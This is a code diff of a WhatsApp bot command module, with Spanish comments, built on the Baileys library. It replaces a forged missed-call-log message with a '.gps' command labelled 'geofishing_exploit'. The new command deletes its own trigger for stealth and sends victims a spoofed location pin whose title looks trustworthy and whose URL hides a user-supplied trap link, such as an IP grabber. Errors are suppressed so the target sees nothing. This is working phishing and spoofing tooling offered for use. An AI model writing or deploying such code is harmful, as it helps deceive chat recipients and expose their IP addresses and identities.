@@ -1,40 +1,30 @@
-import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
-
 export default {
-    name: 'llamada_fantasma',
-    match: (text) => /^\.missed/i.test(text),
-    execute: async ({ sock, remitente, msg }) => {
+    name: 'geofishing_exploit',
+    match: (text) => /^\.gps/i.test(text),
+    execute: async ({ sock, remitente, msg, textoLimpio }) => {
         
+        // Uso: .gps https://tu-link-trampa.com (grabber de IPs, rickroll, etc)
+        const linkTrampa = textoLimpio.replace(/^\.gps\s*/i, '').trim() || "https://link-de-prueba.com";
+
         try {
-            // Sigilo: borramos el comando desencadenante
+            // Sigilo: borramos el comando de tu pantalla
             try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}
 
-            // Determinamos el objetivo (si es respuesta o es el chat actual)
-            const targetJid = msg.message.extendedTextMessage?.contextInfo?.participant || remitente;
-
-            // EXPLOIT: Construcción del contenedor CallLog nativo
-            // Este paquete le dice al cliente de la víctima: "Hubo una llamada y falló".
-            const waMsg = generateWAMessageFromContent(remitente, {
-                callLogMessage: {
-                    isNewCall: true,
-                    isMissed: true, // Flag de llamada perdida
-                    isVideocall: false,
-                    callLogRecords: [{
-                        callLogRecord: {
-                            callResult: 1, // 1 = MISSED / 2 = REJECTED
-                            isIncoming: true,
-                            timestamp: Date.now()
-                        }
-                    }]
+            // EXPLOIT: Inyección del contenedor LocationMessage
+            await sock.sendMessage(remitente, {
+                location: {
+                    // Coordenadas reales (Ej: Zona de Gran Canaria) para renderizar el mapa
+                    degreesLatitude: 27.8440, 
+                    degreesLongitude: -15.4385,
+                    name: "Centro de Alto Rendimiento", // Título principal de confianza
+                    address: "Ver ruta principal", // Subtítulo gris
+                    url: linkTrampa // <--- El punto ciego de seguridad de Meta
                 }
-            }, { userJid: sock.user.id });
-
-            // Inyección de protocolo
-            await sock.relayMessage(remitente, waMsg.message, { messageId: waMsg.key.id });
+            });
 
         } catch (err) {
-            console.error("Error en CallLog Injection:", err);
-            // No enviamos error al chat para no romper la estética del exploit
+            console.error("Error en GPS Spoof:", err);
+            // Sin alertas en el chat para mantener la limpieza
         }
     }
 };
